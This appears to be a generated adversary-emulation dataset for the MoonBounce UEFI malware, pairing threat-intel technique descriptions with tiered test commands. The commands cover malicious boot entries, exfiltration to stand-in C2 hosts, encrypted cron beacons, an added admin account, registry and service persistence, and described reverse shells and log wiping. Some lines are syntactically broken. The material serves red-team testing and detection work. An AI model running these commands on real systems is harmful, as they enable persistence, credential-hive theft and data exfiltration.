extracted_ttps.description: The attackers modified the UEFI firmware to embed a malicious code, allowing them to intercept the original execution flow of the machine's boot sequence and introduce a sophisticated infection chain.
The infection chain itself does not leave any traces on the hard drive, as its components operate in memory only, thus facilitating a fileless attack with a small footprint.
MoonBounce implant is embedded in the UEFI firmware, specifically in the CORE_DXE component, allowing it to persist across reboots and maintain control over the system
The attackers demonstrate a thorough understanding of the UEFI boot process, suggesting they may use social engineering or other tactics to trick users into executing malicious code
The attackers used tools like Psexec, Reg, Sc, WMI, and arp to execute commands on the system
MoonBounce malware infects UEFI firmware, allowing it to persist across system reboots and execute malicious code before the operating system loads
The purpose of the implant is to facilitate the deployment of user-mode malware that stages execution of further payloads downloaded from the internet.
The malware uses a scheduling algorithm with a 672-bit bitmask to determine when to beacon the C2 server

extracted_ttps.technique_name: Exfiltration Over Command and Control Channel
extracted_ttps.description: We detected other non-UEFI implants in the targeted network that communicated with the same infrastructure which hosted the stager's payload.
The attackers used various domains and IPs to communicate with their command and control servers
Attacker used cmd.exe to execute various commands for network reconnaissance and file manipulation
The attackers used the unique TTP of initiating the loader execution through exe in all cases observed
The attackers used UEFI firmware to store malware, allowing it to persist even after a system reboot
The attackers used stealthy techniques to evade detection, including modifying WMI DLLs and using encrypted shellcode

extracted_ttps.technique_name: Exfiltration Over Command and Control Channel
extracted_ttps.description: MoonBounce malware reaches out to a hardcoded C&C URL to fetch another stage of the payload
Attacker used scheduled task to execute malicious commands
The user-mode malware stager deployed by the UEFI implant contains a scheduling logic
Attacker used the rar.exe command line utility to archive and exfiltrate files
The attackers exploited UEFI firmware to gain a foothold in the system
The UEFI implant is used to deploy a user-mode malware stager
Attacker used WMI for remote command execution
Attacker collected files from the local system, including *.hive files
MoonBounce malware may use the Windows loader to discover application windows
MoonBounce malware injects user-mode malware into an svchost.exe process
The attackers used InstallUtil to launch malware on the system
Attacker modified registry to maintain persistence
Attacker used signed binary proxy execution to evade detection
The infection of UEFI firmware is assumed to have occurred remotely, possibly through phishing
Attacker hijacked execution flow to evade detection
Attacker used Psexec for remote command execution
Attacker used user execution to run malicious commands
Attacker removed artefacts from the system
Attacker used WMI to gather information
The attackers used PowerShell-like commands to execute the malware
Attacker used Windows service to maintain persistence
Detected Create or Modify System Process activity via NLP pattern matching
Detected Process Injection activity via NLP pattern matching
Attacker gathered system information
Attacker evaded virtualization/sandbox detection
Detected Application Layer Protocol activity via NLP pattern matching
Attacker used PowerShell to execute commands
Detected Command and Scripting Interpreter activity via NLP pattern matching
Detected Obfuscated Files or Information activity via NLP pattern matching
Detected Exploit Public-Facing Application activity via NLP pattern matching
Detected Windows Management Instrumentation activity via NLP pattern matching
Detected Archive Collected Data activity via NLP pattern matching
Detected Scheduled Task/Job activity via NLP pattern matching
Detected Account Discovery activity via NLP pattern matching
Detected Remote Services activity via NLP pattern matching
Detected Phishing activity via NLP pattern matching

falsepositives: Legitimate firmware update tools executed outside standard system paths

attacks.command: bcdedit /create {12345678-1234-1234-1234-1234567890ab} /d "Malicious EFI" /application BOOTMGR && bcdedit /set {12345678-1234-1234-1234-1234567890ab} device partition=C: && bcdedit /set {12345678-1234-1234-1234-1234567890ab} path \\EFI\\Microsoft\\Boot\\malicious.efi
attacks.description: Intermediate: create a new boot entry with a custom GUID that points to the malicious EFI file.
attacks.expected_behavior: Adds a new boot entry identified by the GUID and configures it to load the placeholder .efi file, making it selectable in the firmware boot menu.

attacks.description: Advanced: ensure the malicious EFI file exists and write a registry entry that influences the UEFI boot order to point to it.
attacks.expected_behavior: Copies the placeholder .efi if missing and updates the UEFI BootOrder registry key so the firmware prioritizes loading the malicious EFI on reboot.

attacks.description: Creating a new boot entry using efibootmgr to simulate malicious boot sequence modification
attacks.expected_behavior: A new boot entry is created, potentially allowing for malicious code execution at boot time

attacks.command: sudo apt-get install -y efibootmgr && sudo efibootmgr --verbose
attacks.description: Installing efibootmgr and displaying detailed information about the boot entries to test for potential vulnerabilities
attacks.expected_behavior: efibootmgr is installed, and detailed boot entry information is displayed, allowing for inspection of the boot configuration

attacks.description: Copies a harmless text file from a remote SMB share to the local temporary folder using the built‑in copy command.
attacks.expected_behavior: If the share \10.0.0.5\share is reachable and the user has read permission, test.txt will appear in the %TEMP% directory.

attacks.description: Uses PowerShell's Copy-Item to retrieve a binary file from a remote SMB share and writes it to %TEMP% with the -Force flag to overwrite if needed.
attacks.expected_behavior: When the UNC path is accessible, sample.bin is created (or overwritten) in the user's temporary directory.

attacks.description: Leverages the built‑in BITS client to download a file from a remote SMB share, storing it in %TEMP%.
attacks.expected_behavior: BITS creates a job named RemoteCopyJob and, upon successful download, tool.exe appears in the temporary folder.

attacks.description: Basic remote copy using SSH's scp to transfer a benign file from the local host to a remote host's /tmp directory.
attacks.expected_behavior: The file /tmp/test_payload.bin is copied over the network to the remote host at 192.168.1.10 and stored as /tmp/received_payload.bin. No changes are made to system files.

attacks.description: Intermediate file copy using curl to download a payload from an HTTP server into /tmp and mark it executable.
attacks.expected_behavior: curl silently fetches the file from the remote web server and writes it to /tmp/downloaded_payload.bin. The chmod command makes the file executable. The operation stays within user-writable space.

attacks.description: Advanced file copy using netcat: a listener on the target receives a streamed file, while the source streams the file over TCP.
attacks.expected_behavior: On the receiving host, netcat listens on port 4444 and writes incoming data to /tmp/nc_received.bin. On the sending host, the content of /tmp/source_payload.bin is piped into netcat, which connects to the listener. The file is transferred in memory and written to /tmp on the receiver.

attacks.command: powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%USERPROFILE%\\Desktop\\UserExec.lnk'); $s.TargetPath = 'cmd.exe'; $s.Arguments = '/c echo User executed shortcut'; $s.Save()"
attacks.description: Creates a shortcut on the user's Desktop that runs cmd.exe with an echo command, mimicking a user‑initiated execution of a malicious shortcut.
attacks.expected_behavior: A .lnk file named UserExec.lnk appears on the Desktop; when the user double‑clicks it, a command prompt opens briefly and displays the echo message.

attacks.command: copy /Y "%SystemRoot%\\System32\\cmd.exe" "%TEMP%\\update.exe" && powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%USERPROFILE%\\Desktop\\Update.lnk'); $s.TargetPath = '%TEMP%\\update.exe'; $s.Arguments = '/c echo Updating system'; $s.Save()"
attacks.description: Copies cmd.exe to a disguised name in the TEMP directory and creates a Desktop shortcut pointing to it, representing a social‑engineering lure where the user runs a seemingly legitimate update tool.
attacks.expected_behavior: An executable named update.exe is placed in %TEMP% and a shortcut Update.lnk appears on the Desktop; double‑clicking the shortcut runs the echo command.

attacks.description: Writes a base64‑encoded batch file to %TEMP%, decodes it with certutil, and creates a Desktop shortcut that runs the batch, emulating a user executing a malicious script delivered via social engineering.
attacks.expected_behavior: A batch file payload.bat is created in %TEMP% containing simple echo commands; a shortcut Payload.lnk on the Desktop points to this batch. When the user runs the shortcut, the echo messages appear in a command window.

attacks.command: reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v TestRun /t REG_SZ /d \"cmd.exe /c echo RegistryRun > %TEMP%\\reg.txt\" /f
attacks.description: Adds a value to the current user's Run registry key that executes a harmless echo command at logon.
attacks.expected_behavior: When the user logs on, cmd.exe runs and creates %TEMP%\reg.txt containing the string 'RegistryRun'.

attacks.command: sc create TestService binPath= \"cmd.exe /c echo ServiceCreated > %TEMP%\\svc.txt\" start= demand
attacks.description: Creates a new Windows service that runs a benign echo command when started.
attacks.expected_behavior: The service is registered; when started (manually or via sc start TestService) it writes %TEMP%\svc.txt with the text 'ServiceCreated'.

attacks.description: Uses PsExec to launch a System‑level cmd.exe process that writes a test file.
attacks.expected_behavior: PsExec runs cmd.exe as the SYSTEM account, creating %TEMP%\psexec.txt containing 'PsexecExecuted'.

attacks.description: Executes a simple command using the bash interpreter to display the current user.
attacks.expected_behavior: Outputs the username of the account running the command.

attacks.description: Runs a bash command with sudo to write a test string into /etc/hostname, demonstrating privileged command execution.
attacks.expected_behavior: Overwrites the /etc/hostname file with the text "root test"; requires root privileges.

attacks.description: Creates a temporary script file, writes a harmless command (id) into it, makes it executable, runs it, and then deletes the file.
attacks.expected_behavior: Displays the current user's UID and GID, then cleans up the temporary script file.

attacks.description: Creates a plain text file with benign content and encodes it to Base64 using certutil, demonstrating simple file obfuscation.
attacks.expected_behavior: A file named obf.txt appears in the TEMP directory containing the Base64 representation of the original text.

attacks.command: powershell -Command "$mask = ('1' * 672); $day = (Get-Date).DayOfYear; if ($mask[($day % $mask.Length)] -eq '1') { Write-Output 'Beacon allowed' } else { Write-Output 'Beacon suppressed' }"
attacks.description: Generates a 672‑bit mask of all 1s and uses the current day of year to index the mask, deciding whether to emit a beacon message. This mimics a scheduling algorithm using a bitmask for evasion.
attacks.expected_behavior: Outputs either 'Beacon allowed' or 'Beacon suppressed' depending on the computed mask index.

attacks.description: Encodes a PowerShell payload in Base64, constructs an encoded command line, and registers a scheduled task that runs the obfuscated script daily. This combines file obfuscation with persistence and requires elevated privileges.
attacks.expected_behavior: A scheduled task named 'ObfTask' is created; when triggered, it runs the Base64‑encoded PowerShell script which outputs 'Hello'.

attacks.description: Creates a base64‑encoded script that simply echoes a beacon message, makes it executable, and adds a user‑level cron job to run it every 5 minutes.
attacks.expected_behavior: Every 5 minutes the cron daemon executes $HOME/.beacon.sh, which prints 'Beacon by base64 encoded' to the user's console or log.

attacks.command:
dd if=/dev/urandom of=$HOME/.mask.bin bs=84 count=1 status=none && echo -e "#!/bin/bash
mask=$(xxd -p $HOME/.mask.bin)
minute=$(date +%M)
bit=$(( (0x${mask:$(printf "%d" $((minute/2)))%2:1}) & 1 ))
if [ $bit -eq 1 ]; then echo 'Masked beacon triggered' >> $HOME/beacon.log; fi" > $HOME/.masked_beacon.sh && chmod +x $HOME/.masked_beacon.sh && (crontab -l 2>/dev/null; echo "* * * * * $HOME/.masked_beacon.sh") | crontab -
attacks.description: Generates a 672‑bit (84‑byte) random mask, stores it, and creates a script that reads the current minute, extracts the corresponding bit from the mask, and logs a beacon only when the bit is 1. The script is scheduled to run every minute via user crontab.
attacks.expected_behavior: Each minute the script checks the mask; roughly half the minutes it writes 'Masked beacon triggered' to $HOME/beacon.log, demonstrating conditional execution based on a 672‑bit mask.

attacks.command:
dd if=/dev/urandom of=$HOME/.mask.bin bs=84 count=1 status=none && echo -e "#!/bin/bash
key=$(xxd -p $HOME/.mask.bin | head -c 32)
payload='ZWNobyAiQWR2YW5jZWQgZW5jcnlwdGVkIGJlYWNvbiI='
echo $payload | openssl enc -aes-256-cbc -d -salt -pass pass:$key -base64 -out /tmp/decrypted.sh && chmod +x /tmp/decrypted.sh && /tmp/decrypted.sh" > $HOME/.encrypted_beacon.sh && chmod +x $HOME/.encrypted_beacon.sh && (crontab -l 2>/dev/null; echo "*/2 * * * * $HOME/.encrypted_beacon.sh") | crontab -
attacks.description: Creates a 672‑bit mask, derives a 16‑byte key from it, encrypts a harmless echo command with OpenSSL using that key, stores the encrypted payload, and builds a wrapper script that decrypts and executes the payload every 2 minutes via crontab.
attacks.expected_behavior: Every two minutes the wrapper script decrypts the payload using the mask‑derived key and runs it, resulting in the message 'Advanced encrypted beacon' being printed, illustrating encrypted/obfuscated execution.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Downloads a malicious executable from a C2 server using certutil.exe and executes it
attacks.expected_behavior: Executes the downloaded malware

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: powershell -Command "Invoke-WebRequest -Uri http://example.com/data -OutFile %TEMP%\data.txt; Get-Content %TEMP%\data.txt | Invoke-WebRequest -Uri http://example.com/exfil -Method Post -Body {$_)"
attacks.description: Downloads data from a C2 server using PowerShell, reads the content, and exfiltrates it to another C2 server
attacks.expected_behavior: Exfiltrates data to the C2 server

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Basic exfiltration: sends the contents of /etc/hostname to the C2 server via an HTTP POST request.
attacks.expected_behavior: The C2 endpoint receives a POST request containing the hostname string.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Intermediate exfiltration: compresses the system log and streams it over a raw TCP connection to the C2 server.
attacks.expected_behavior: The C2 listener on port 4444 receives a gzip‑compressed stream of the syslog file.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: bash -c 'for i in {1..5}; do uname -a; cat /etc/hostname; sleep 10; done | base64 | openssl s_client -quiet -connect 10.0.0.1:8443'
attacks.description: Advanced exfiltration: periodically gathers system information, encodes it, and sends it over an encrypted TLS channel to the C2 server.
attacks.expected_behavior: The C2 server receives five base64‑encoded blocks, each containing the output of uname and the hostname, over a TLS‑encrypted connection.

attacks.description: Downloads a benign file from a C2 server over HTTPS (port 443) using certutil, a native Windows utility often abused for covert data transfer.
attacks.expected_behavior: The file payload.bin is saved to the user's temporary directory if the URL is reachable; network traffic appears as normal HTTPS traffic on port 443.

attacks.description: Creates a TCP connection to a C2 server on port 53 (commonly used for DNS) and sends a simple 'ping' payload, illustrating C2 traffic over a well‑known service port.
attacks.expected_behavior: Attempts to connect to example.com on port 53; if successful, the string 'ping' is transmitted. No files are written to disk.

attacks.description: Downloads a PowerShell script from a C2 server over HTTP (port 80) and executes it, demonstrating a staged C2 operation using a commonly allowed web port.
attacks.expected_behavior: The script c2script.ps1 is saved to the temporary directory and then executed. Network traffic uses standard HTTP on port 80, blending with normal web activity.

attacks.command: if command -v systemd-detect-virt >/dev/null; then systemd-detect-virt -q && echo "Running inside a virtual environment, exiting" && exit 0; fi
attacks.description: Basic virtualization check that terminates the script if the host is a VM or container, demonstrating simple sandbox evasion.
attacks.expected_behavior: The command queries systemd-detect-virt; if it reports a virtual environment, a message is printed and the shell exits with status 0. Otherwise execution continues.

attacks.command: sudo sysctl -w kernel.randomize_va_space=0 && echo "ASLR disabled to hinder analysis"
attacks.description: Intermediate evasion that disables address space layout randomization, making memory‑based detections less reliable.
attacks.expected_behavior: The sysctl command sets kernel.randomize_va_space to 0, turning off ASLR. The change persists until the next reboot. A confirmation message is printed.

attacks.description: Advanced evasion that decodes an encrypted (base64) shell script payload into a temporary in‑memory location, executes it, and cleans up, mimicking encrypted shellcode execution.
attacks.expected_behavior: The base64 string is decoded to /dev/shm/payload.sh, made executable, run (printing a hello message), and then removed. No persistent files remain on disk.

attacks.description: Creates a one‑time scheduled task for the current user that writes a test file to the temporary directory.
attacks.expected_behavior: The task appears in Task Scheduler and runs at 23:59, creating %TEMP%\basic.txt containing the string 'BasicTask'.

attacks.description: Creates a daily scheduled task with limited rights that writes a test file each morning at 09:00.
attacks.expected_behavior: The task runs every day at 09:00, creating or overwriting %TEMP%\daily.txt with the text 'DailyRun'.

attacks.description: Creates a task that runs at system start under the SYSTEM account, executing a PowerShell command to write a file.
attacks.expected_behavior: When the system boots, the task runs as SYSTEM and creates %TEMP%\sys.txt containing 'SystemTask'.

attacks.description: Creates a user‑level cron job that runs every minute and appends a test string to ~/cron_test.log.
attacks.expected_behavior: A new cron entry is added to the current user's crontab; each minute the echo command runs and writes to the log file.

attacks.command: echo "*/5 * * * * root /usr/bin/env echo 'Root cron executed' >> /var/log/root_cron.log" | sudo tee /etc/cron.d/testtask > /dev/null
attacks.description: Creates a system‑wide cron file that runs every 5 minutes as root, logging to /var/log/root_cron.log.
attacks.expected_behavior: The file /etc/cron.d/testtask is created with a cron entry; the cron daemon will execute the echo command every 5 minutes with root privileges.

attacks.description: This command uses rar.exe to archive all files in the Public Documents folder and save the archive to the %TEMP% directory.
attacks.expected_behavior: The command will create an archive file in the %TEMP% directory containing all files from the Public Documents folder.

attacks.description: This command uses PowerShell to compress all files in the Public Documents folder and save the archive to the %TEMP% directory.
attacks.expected_behavior: The command will create a zip archive file in the %TEMP% directory containing all files from the Public Documents folder.

attacks.description: This command uses rar.exe to archive all files in the Public Documents folder, sets a password for the archive, and saves the archive to the %TEMP% directory.
attacks.expected_behavior: The command will create a password-protected archive file in the %TEMP% directory containing all files from the Public Documents folder.

attacks.description: Archive a test file with rar and exfiltrate the archive over a raw TCP connection using netcat.
attacks.expected_behavior: Creates /tmp/data.rar containing /tmp/testfile.txt and streams the archive to the remote host at 192.0.2.10 on port 4444.

attacks.description: Create a password‑protected rar archive of /etc/hosts and send it via UDP using socat.
attacks.expected_behavior: Generates /tmp/secure.rar (encrypted with password 'SecretPass') and transmits the binary data to 192.0.2.20 on UDP port 5555.

attacks.description: Archive system log files with rar and exfiltrate the archive over SSH using scp.
attacks.expected_behavior: Creates /tmp/full.rar containing syslog and auth.log, then copies the archive to the remote host 192.0.2.30 under /tmp/ via an SSH connection.

attacks.description: Simulate downloading and executing a malicious file from a public-facing application using certutil.
attacks.expected_behavior: Downloads a file from the specified URL and executes it, simulating the exploitation of a public-facing application.

attacks.description: Use PowerShell to download and execute a malicious script, demonstrating a more advanced exploitation technique.
attacks.expected_behavior: Downloads a PowerShell script from the specified URL and executes it, simulating the exploitation of a public-facing application using PowerShell.

attacks.command: cmd.exe /c net user /add testuser testpassword && net localgroup administrators testuser /add
attacks.description: Simulate creating a new user and adding them to the administrators group, a potential post-exploitation action.
attacks.expected_behavior: Creates a new user and adds them to the administrators group, demonstrating a possible action after gaining initial access.

attacks.description: Basic: Copy a crafted EFI binary (evil.efi) into the EFI system partition so it can be loaded by the firmware on the next boot.
attacks.expected_behavior: The file evil.efi is placed in /boot/efi/EFI/ubuntu/. No immediate execution occurs; the binary will be available for the firmware to load on reboot if a boot entry points to it.

attacks.description: Intermediate: Register a new UEFI boot entry that points to the malicious EFI binary placed on the EFI partition.
attacks.expected_behavior: efibootmgr adds a new boot entry labeled "Malicious". Running 'efibootmgr -v' will show the entry referencing \EFI\ubuntu\evil.efi.

attacks.description: Advanced: Attempt to flash a crafted, unsigned firmware package using fwupdmgr, bypassing signature verification.
attacks.expected_behavior: fwupdmgr processes the CAB file and tries to write the firmware to the device. In a test environment the operation will either succeed with a mock firmware or fail with an error, demonstrating the firmware‑flashing step of the exploit.

attacks.command: mkdir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Test" -ErrorAction SilentlyContinue; echo "Test Autostart" > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Test\test.bat"; echo "@echo off" >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Test\test.bat"; echo "start notepad.exe" >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Test\test.bat"
attacks.description: Creates a Startup folder entry to run a test batch file at logon, which starts Notepad.
attacks.expected_behavior: Notepad opens at user logon

attacks.description: Creates a scheduled task to run Notepad at user logon using PowerShell.
attacks.expected_behavior: Notepad opens at user logon

attacks.description: Modifies the Registry to add an autostart entry for Notepad.
attacks.expected_behavior: Notepad opens at user logon

attacks.command: sudo bash -c 'printf "#!/bin/bash\n echo \"Boot test\" >> /tmp/bootlog.txt\n" > /etc/rc.local && chmod +x /etc/rc.local && update-rc.d rc.local defaults'
attacks.description: Create a simple rc.local script that logs a message at boot and enable it via update-rc.d.
attacks.expected_behavior: On the next system boot, /etc/rc.local runs, appending 'Boot test' to /tmp/bootlog.txt.

attacks.command:
sudo bash -c 'cat > /etc/systemd/system/boot-test.service <<"EOF"
[Unit]
Description=Boot Test Service
After=network.target
[Service]
Type=oneshot
ExecStart=/usr/local/bin/boot-test.sh
[Install]
WantedBy=multi-user.target
EOF
 && printf "#!/bin/bash\necho \"Boot test service\" >> /tmp/bootlog.txt\n" > /usr/local/bin/boot-test.sh && chmod +x /usr/local/bin/boot-test.sh && systemctl daemon-reload && systemctl enable boot-test.service'
attacks.description: Create a systemd service that runs a benign script at boot and enable it.
attacks.expected_behavior: When the system reaches the multi‑user target, systemd executes /usr/local/bin/boot-test.sh, which appends 'Boot test service' to /tmp/bootlog.txt.

attacks.description: Copy a benign EFI binary and register a new UEFI boot entry that will be executed on the next firmware boot.
attacks.expected_behavior: On the next reboot, the firmware loads the newly created boot entry which runs the copied 'true' binary (no side effects). The presence of the entry can be verified with efibootmgr.

attacks.description: Basic WMI remote execution using wmic.exe to run the harmless command 'whoami' on the remote host.
attacks.expected_behavior: The remote system creates a new cmd.exe process that outputs the current user name; the result is returned to the local console via WMI.

attacks.command: powershell -Command "$cred = New-Object System.Management.Automation.PSCredential('USERNAME',(ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force)); Get-WmiObject -Class Win32_Process -ComputerName TARGET_HOST -Credential $cred | ForEach-Object { $_.Create('cmd.exe /c ipconfig /all') }"
attacks.description: Intermediate PowerShell command that uses Get-WmiObject with explicit credentials to start a remote process that runs 'ipconfig /all' on the target.
attacks.expected_behavior: A remote cmd.exe process is spawned on TARGET_HOST, executing 'ipconfig /all'; the network configuration output is sent back through the WMI call.

attacks.description: Basic WMI query from Linux to retrieve the operating system caption of the remote Windows host.
attacks.expected_behavior: The command returns the OS name (e.g., "Microsoft Windows 10 Pro") from the remote host.

attacks.command: wmic -U "username%password" //192.168.1.10 "process call create \"cmd.exe /c echo test > C:\\Temp\\test.txt\""
attacks.description: Intermediate use of WMI to launch a remote cmd.exe process that writes a harmless test file on the Windows machine.
attacks.expected_behavior: A file named test.txt containing the word "test" is created in C:\Temp on the remote host.

attacks.description: Advanced WMI execution that starts a remote PowerShell process to display a benign message, demonstrating command chaining via WMI.
attacks.expected_behavior: The remote PowerShell instance prints "WMI test" to its standard output (visible in the wmic response).

attacks.description: Copies the SOFTWARE registry hive to the temporary directory for later analysis.
attacks.expected_behavior: A file named software.hive is created in the %TEMP% folder containing the contents of the SYSTEM's SOFTWARE hive.

attacks.description: Archives the SYSTEM, SAM, and SECURITY registry hives into a single ZIP file in the temporary directory.
attacks.expected_behavior: Creates hives.zip in %TEMP% containing the three specified hive files.

attacks.description: Base64‑encodes the ZIP archive with certutil and then deletes the original ZIP to leave only the encoded representation.
attacks.expected_behavior: A file named hives.b64 is created in %TEMP% containing the Base64 representation of hives.zip, and the original hives.zip is removed.

attacks.description: Find all files with the .hive extension on the system.
attacks.expected_behavior: Lists all files with the .hive extension found on the system, potentially requiring admin privileges to access all areas.

attacks.description: Copy configuration files from /etc/ to the user's home directory.
attacks.expected_behavior: Copies configuration files to the user's home directory, demonstrating data collection from local system files without needing admin privileges.

attacks.description: Compress and archive log files from /var/log/ to the user's home directory.
attacks.expected_behavior: Creates a compressed archive of log files in the user's home directory, which may require admin privileges to access log files.

attacks.description: List all running applications
attacks.expected_behavior: The command will list all running applications, including their PID, memory usage, and window title.

attacks.description: Query window information using wmic
attacks.expected_behavior: The command will query window information, including the window handle, title, and size.

attacks.description: Get the title of all running application windows using PowerShell
attacks.expected_behavior: The command will get the title of all running application windows and print them to the console.

attacks.command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v TestPersistence /t REG_SZ /d "cmd.exe /c echo PersistenceTest" /f
attacks.description: Adds a benign string value to the current user's Run registry key to achieve persistence on user logon.
attacks.expected_behavior: A new entry named 'TestPersistence' appears under HKCU\...\Run with the specified command string. The entry will cause the command to run each time the user logs in.

attacks.description: Creates a system‑wide Run key entry that launches Notepad at every system boot, demonstrating persistence requiring elevated rights.
attacks.expected_behavior: A new value 'SystemPersistence' is added under HKLM\...\Run. Notepad will start automatically for all users after the next reboot.

attacks.command: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "cmd.exe /c start notepad.exe" /f
attacks.description: Modifies the Winlogon Shell registry value to replace the default explorer.exe shell with a command that launches Notepad, providing advanced persistence.
attacks.expected_behavior: The 'Shell' value under Winlogon is changed. On the next user logon, instead of Explorer, the specified command runs, launching Notepad. This requires admin privileges and persists across reboots.

attacks.description: Modify a system configuration file to add a test string, simulating persistence by altering system files.
attacks.expected_behavior: The command will append 'test_string' to /etc/test_config.conf, demonstrating modification of system configuration files for persistence, requiring admin privileges.

attacks.description: Modify the bashrc file to add an alias, simulating a persistence technique by altering user shell configurations.
attacks.expected_behavior: The command adds an alias for 'ls' to display detailed listings by default, demonstrating how an attacker might modify user environments for persistence.

attacks.command: sudo crontab -l | { cat; echo "0 0 * * * /path/to/malicious/script.sh"; } | sudo crontab -
attacks.description: Modify the cron table to schedule a hypothetical malicious script, simulating persistence through scheduled tasks.
attacks.expected_behavior: The command schedules a script to run daily at midnight, demonstrating how an attacker might use cron jobs for persistence. Replace '/path/to/malicious/script.sh' with a benign script for testing.

attacks.command: sudo pkexec -u root /bin/bash -c 'echo "Testing Signed Binary Proxy Execution" > /tmp/test.txt'
attacks.description: Basic example using pkexec to execute a command as root, writing to a file.
attacks.expected_behavior: Creates a file /tmp/test.txt with the specified string, demonstrating proxy execution as root.

attacks.description: Intermediate example using systemctl to start a user service that executes a command.
attacks.expected_behavior: Starts a user service that executes a bash command, writing to /tmp/intermediate_test.txt, showcasing a more complex proxy execution scenario.

attacks.command: sudo /usr/bin/dbus-launch --exit-with-session /bin/bash -c 'echo "Advanced Signed Binary Proxy Execution Test" > /tmp/advanced_test.txt'
attacks.description: Advanced example utilizing dbus-launch to execute a command through a D-Bus session.
attacks.expected_behavior: Executes a command through dbus-launch, writing to /tmp/advanced_test.txt, demonstrating an advanced scenario of proxy execution.

attacks.command: echo 'You have won a prize, click here to claim: http://example.com/malicious-link' | mail -s 'You are a winner!' user@example.com
attacks.description: Simulate a phishing email using the mail command to send a spoofed email with a malicious link.
attacks.expected_behavior: The command sends an email to the specified user with a subject and body that could trick the user into clicking a malicious link, demonstrating a basic phishing attempt.

attacks.description: Simulate downloading and executing a malicious script from a URL, mimicking an advanced phishing scenario where the user is tricked into running malicious code.
attacks.expected_behavior: The command downloads a script from a specified URL and executes it, demonstrating how a phishing attack could lead to the execution of malicious code on a Linux system.

attacks.description: Simulate accessing a phishing webpage and saving it locally, then opening it with the default browser, demonstrating an intermediate phishing scenario.
attacks.expected_behavior: The command downloads a phishing webpage and opens it in the default browser, simulating a user being tricked into interacting with a malicious webpage.

attacks.description: Basic hijacking of execution flow using LD_PRELOAD
attacks.expected_behavior: The target binary will load the malicious shared library, allowing the attacker to hijack the execution flow.

attacks.description: Intermediate hijacking of execution flow using LD_PRELOAD and export
attacks.expected_behavior: The target binary will load the malicious shared library, and the export statement will ensure the LD_PRELOAD environment variable is set for the current shell session.

attacks.description: Advanced hijacking of execution flow using LD_PRELOAD, export, and malicious code injection
attacks.expected_behavior: The target binary will load the malicious shared library, which contains the injected malicious code, allowing the attacker to hijack the execution flow and potentially gain elevated privileges.

attacks.description: Basic remote execution using PsExec to run the whoami command on the target host.
attacks.expected_behavior: The remote host returns the username under which the command runs (e.g., testuser).

attacks.command: sc \\192.168.1.10 create TestService binPath= "cmd.exe /c echo ServiceCreated > %TEMP%\\svc.txt" start= demand
attacks.description: Intermediate technique: creates a temporary service on the remote machine that writes a benign file to %TEMP%.
attacks.expected_behavior: A new service named TestService appears on the remote host; when started, it creates svc.txt containing the string 'ServiceCreated' in the target's %TEMP% directory.

attacks.description: Advanced remote execution: runs a command as SYSTEM on the remote host, writing a test file to %TEMP%.
attacks.expected_behavior: The remote host creates adv.txt in its %TEMP% directory containing the text 'AdvancedTest', and the process runs under the SYSTEM account.

attacks.description: Basic key‑based SSH remote command execution to retrieve the remote host's name.
attacks.expected_behavior: The command connects to the target via SSH using the specified private key and prints the remote system's hostname to the local console.

attacks.description: Password‑based SSH remote command execution using sshpass to supply credentials non‑interactively.
attacks.expected_behavior: Authenticates to the remote host with the provided password and runs the 'id' command, displaying the user and group information of the remote session.

attacks.description: Advanced remote shell setup using SSH to launch a netcat‑based reverse shell from the target back to the attacker.
attacks.expected_behavior: Creates a named pipe on the remote host, redirects a bash interactive session through netcat, and connects back to the attacker's listener on port 4444, providing a remote interactive shell.

attacks.description: Remove authentication log file to evade detection of login attempts
attacks.expected_behavior: The command removes the authentication log file, potentially removing evidence of malicious login attempts. This requires admin privileges and poses a high safety risk as it permanently deletes system logs.

attacks.description: Shred log files to securely delete potential indicators of compromise
attacks.expected_behavior: This command uses shred to securely delete log files, making it difficult to recover the data. It requires admin privileges and is considered high risk due to the permanent and secure deletion of system logs.

attacks.description: Clear the system log file to remove indicators of malicious activity
attacks.expected_behavior: This command clears the system log file by overwriting it with an empty string. It requires admin privileges and poses a medium safety risk as it alters system logs but does not permanently delete them.

attacks.description: Execute a PowerShell command to write the current date to a file in the temp directory
attacks.expected_behavior: A file named date.txt will be created in the temp directory containing the current date

attacks.description: Execute a PowerShell command to compress the date.txt file into a zip archive
attacks.expected_behavior: A zip file named date.zip will be created in the temp directory containing the date.txt file

attacks.description: Execute a PowerShell command to remove the date.txt file
attacks.expected_behavior: The date.txt file will be removed from the temp directory

attacks.command: sc.exe create TestService binPath= "C:\\Windows\\System32\\cmd.exe /c echo 'Test Service' > %TEMP%\\test.txt"
attacks.description: Create a new Windows service using sc.exe
attacks.expected_behavior: A new service named TestService will be created, and when started, it will write 'Test Service' to a file in the temp directory.

attacks.description: Start the newly created TestService using net.exe
attacks.expected_behavior: The TestService service will be started, executing the command specified in its binPath, which writes to a temp file.

attacks.description: Stop and delete the TestService using PowerShell
attacks.expected_behavior: The TestService will be stopped and then deleted, including its registry entry. This command has a higher safety risk due to the use of -Force and registry modification.

attacks.command:
sudo cp /tmp/payload.sh /usr/local/bin/payload.sh && sudo chmod +x /usr/local/bin/payload.sh && echo -e "[Unit]
Description=Persistent Payload
After=network.target
[Service]
ExecStart=/usr/local/bin/payload.sh
Restart=always
[Install]
WantedBy=multi-user.target" | sudo tee /etc/systemd/system/payload.service > /dev/null && sudo systemctl daemon-reload && sudo systemctl enable --now payload.service
attacks.description: Install a benign script system‑wide and register it as a new systemd service for automatic start on boot.
attacks.expected_behavior: The script is copied to /usr/local/bin, made executable, a service unit file is created under /etc/systemd/system, the daemon is reloaded, and the service starts immediately and on subsequent boots.

